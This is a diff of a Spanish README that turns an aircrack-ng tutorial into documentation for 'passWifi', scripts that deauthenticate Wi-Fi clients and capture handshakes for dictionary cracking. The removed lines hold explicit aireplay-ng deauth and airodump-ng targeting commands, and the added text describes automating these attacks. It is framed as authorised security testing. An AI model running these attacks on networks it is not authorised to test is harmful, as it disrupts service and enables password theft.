@@ -1,20 +1,34 @@
-# Tutorial: Instalación de Airmon-ng y Ataque de Deauth en Debian
+<h1 align="center">passWifi - Scripts para Ataques de Deauth y Captura de Hashcap</h1>
+
+<p align="center">
+  <img src="https://github.com/Gerijacki.png" width="100" alt="Logo"/><br/>
+  Hi 👋, I'm <a href="https://github.com/Gerijacki">Gerijacki</a>
+</p>
+
+<p align="center">
+  <a href="https://github.com/Gerijacki/passWifi/stargazers"><img src="https://img.shields.io/github/stars/Gerijacki/passWifi?colorA=363a4f&colorB=b7bdf8&style=for-the-badge"></a>
+  <a href="https://github.com/Gerijacki/passWifi/issues"><img src="https://img.shields.io/github/issues/Gerijacki/passWifi?colorA=363a4f&colorB=f5a97f&style=for-the-badge"></a>
+  <a href="https://github.com/Gerijacki/passWifi/contributors"><img src="https://img.shields.io/github/contributors/Gerijacki/passWifi?colorA=363a4f&colorB=a6da95&style=for-the-badge"></a>
+</p>
 
 ## Introducción
 
-Este tutorial te guiará a través de la instalación de `airmon-ng` y otras herramientas relacionadas en una máquina Debian. También aprenderás cómo realizar un ataque de deautenticación (deauth) a un punto de acceso (AP) y un dispositivo específico.
+**passWifi** es un conjunto de scripts diseñados para realizar ataques de deautenticación (deauth) a puntos de acceso (AP) y capturar hashcaps para su posterior desencriptación. Estos scripts están destinados a pruebas de seguridad en redes Wi-Fi dentro de un entorno controlado y legal.
 
 ## Advertencia Legal
 
-El uso de estas herramientas para realizar un ataque de deauth en una red o dispositivo sin el consentimiento expreso del propietario es ilegal y puede tener graves consecuencias legales. Este tutorial se proporciona únicamente con fines educativos. El autor no se hace responsable del uso indebido de la información proporcionada.
+El uso de estos scripts para realizar ataques de deauth o capturar hashcaps en redes o dispositivos sin el consentimiento expreso del propietario es ilegal y puede tener graves consecuencias legales. Este proyecto se proporciona únicamente con fines educativos. El autor no se hace responsable del uso indebido de la información proporcionada.
 
 ## Requisitos Previos
 
 - Una máquina con Debian o derivada.
 - Acceso de superusuario (root) o permisos `sudo`.
 - Una tarjeta de red Wi-Fi compatible con el modo monitor.
+- Herramientas de airecrack-ng instaladas (`airmon-ng`, `aireplay-ng`, `airodump-ng`).
 
-## Instalación de Airmon-ng y Herramientas Relacionadas
+## Instalación
+
+Para instalar **passWifi** y configurar las herramientas necesarias, sigue estos pasos:
 
 ### Paso 1: Actualizar los Repositorios
 
@@ -26,102 +40,86 @@ sudo apt update
 
 ### Paso 2: Instalar Aircrack-ng
 
-`airmon-ng` es parte del paquete `aircrack-ng`, así que instalaremos el paquete completo:
+Instala el paquete completo de `aircrack-ng`, que incluye `airmon-ng`, `aireplay-ng`, `airodump-ng`, entre otras herramientas:
 
 ```bash
 sudo apt install aircrack-ng
 ```
 
-### Paso 3: Verificar la Instalación
+### Paso 3: Clonar el Repositorio
 
-Verifica que `airmon-ng` y las herramientas relacionadas se hayan instalado correctamente:
-
-```bash
-airmon-ng --help
-```
-
-Si ves la información de ayuda, la instalación se ha realizado con éxito.
-
-## Habilitar el Modo Monitor
-
-### Paso 1: Identificar tu Interfaz Wi-Fi
-
-Primero, identifica tu interfaz Wi-Fi:
+Clona el repositorio **passWifi** desde GitHub:
 
 ```bash
-sudo airmon-ng
+git clone https://github.com/Gerijacki/passWifi.git
+cd passWifi
 ```
 
-Esto te dará una lista de las interfaces disponibles. Supongamos que la interfaz es `wlan0`.
+### Paso 4: Dar Permisos de Ejecución
 
-### Paso 2: Habilitar el Modo Monitor
-
-Habilita el modo monitor en tu interfaz Wi-Fi:
+Da permisos de ejecución a los scripts incluidos:
 
 ```bash
-sudo airmon-ng start wlan0
+chmod +x deauth.sh hashcap.sh
 ```
 
-Esto cambiará la interfaz a `wlan0mon` o similar.
+## Uso de los Scripts
 
-### Paso 3: Verificar el Modo Monitor
+### Script de Deauth Total (`deauth.sh`)
 
-Verifica que el modo monitor esté activado:
+El script `deauth.sh` realiza un ataque de deautenticación a todos los dispositivos conectados a un punto de acceso (AP) o a un dispositivo específico.
 
-```bash
-sudo iwconfig
-```
+1. Ejecuta el script:
 
-## Ataque de Deautenticación
+   ```bash
+   sudo ./deauth.sh
+   ```
 
-### Paso 1: Escanear las Redes Wi-Fi Disponibles
+2. Sigue las instrucciones para:
+   - Introducir el nombre de la interfaz Wi-Fi.
+   - Habilitar el modo monitor.
+   - Escanear redes Wi-Fi y seleccionar el AP objetivo.
+   - Realizar el ataque de deauth a todos los dispositivos o a uno específico.
 
-Escanea las redes Wi-Fi para identificar el punto de acceso (AP) y el dispositivo objetivo:
+### Script de Captura de Hashcap (`hashcap.sh`)
 
-```bash
-sudo airodump-ng wlan0mon
-```
+El script `hashcap.sh` realiza un ataque de deauth y captura un hashcap para su posterior desencriptación.
 
-Esto mostrará una lista de APs y dispositivos conectados. Anota el BSSID del AP y el número de canal (CH) al que está conectado el dispositivo.
+1. Ejecuta el script:
 
-### Paso 2: Enfocar el Escaneo en un AP
+   ```bash
+   sudo ./hashcap.sh
+   ```
 
-Para enfocarte en un AP específico y sus dispositivos conectados, usa:
-
-```bash
-sudo airodump-ng --bssid <BSSID_DEL_AP> --channel <CANAL> wlan0mon
-```
-
-Mantén esta ventana abierta para ver los dispositivos conectados al AP.
-
-### Paso 3: Realizar el Ataque de Deauth
-
-Para desconectar un dispositivo específico del AP:
-
-```bash
-sudo aireplay-ng --deauth 10 -a <BSSID_DEL_AP> -c <MAC_DEL_DISPOSITIVO> wlan0mon
-```
-
-- `--deauth 10`: Envía 10 paquetes de deauth.
-- `-a <BSSID_DEL_AP>`: Especifica el BSSID del AP.
-- `-c <MAC_DEL_DISPOSITIVO>`: Especifica la dirección MAC del dispositivo objetivo.
-
-Para desconectar todos los dispositivos del AP:
-
-```bash
-sudo aireplay-ng --deauth 10 -a <BSSID_DEL_AP> wlan0mon
-```
+2. Sigue las instrucciones para:
+   - Introducir el nombre de la interfaz Wi-Fi.
+   - Habilitar el modo monitor.
+   - Escanear redes Wi-Fi y seleccionar el AP objetivo.
+   - Capturar el handshake y, opcionalmente, realizar un ataque de deauth para forzar la captura.
+   - Verificar y desencriptar el handshake utilizando un diccionario.
 
 ## Deshabilitar el Modo Monitor
 
-Cuando hayas terminado, desactiva el modo monitor y vuelve al modo gestionado:
+Cuando hayas terminado con el uso de los scripts, desactiva el modo monitor y vuelve al modo gestionado:
 
 ```bash
 sudo airmon-ng stop wlan0mon
 ```
 
-Esto devolverá tu interfaz Wi-Fi al modo normal.
+Reemplaza `wlan0mon` con el nombre de tu interfaz en modo monitor si es diferente.
 
 ## Conclusión
 
-Has aprendido cómo instalar `airmon-ng` y realizar un ataque de deauth en un AP y un dispositivo específico en una máquina Debian. Recuerda siempre actuar dentro de los límites de la ley y usar este conocimiento de manera ética.
+Has aprendido cómo utilizar los scripts de **passWifi** para realizar ataques de deauth y capturar hashcaps en una máquina Debian. Recuerda siempre actuar dentro de los límites de la ley y usar este conocimiento de manera ética.
+
+---
+
+<p align="center">
+  <a href="https://github.com/Gerijacki">
+    <img src="https://github-readme-stats.vercel.app/api?username=Gerijacki&show_icons=true&theme=dark&count_private=true" alt="GitHub Stats" />
+  </a>
+</p>
+
+<p align="center">
+  <img src="https://raw.githubusercontent.com/Trilokia/Trilokia/379277808c61ef204768a61bbc5d25bc7798ccf1/bottom_header.svg" />
+</p>
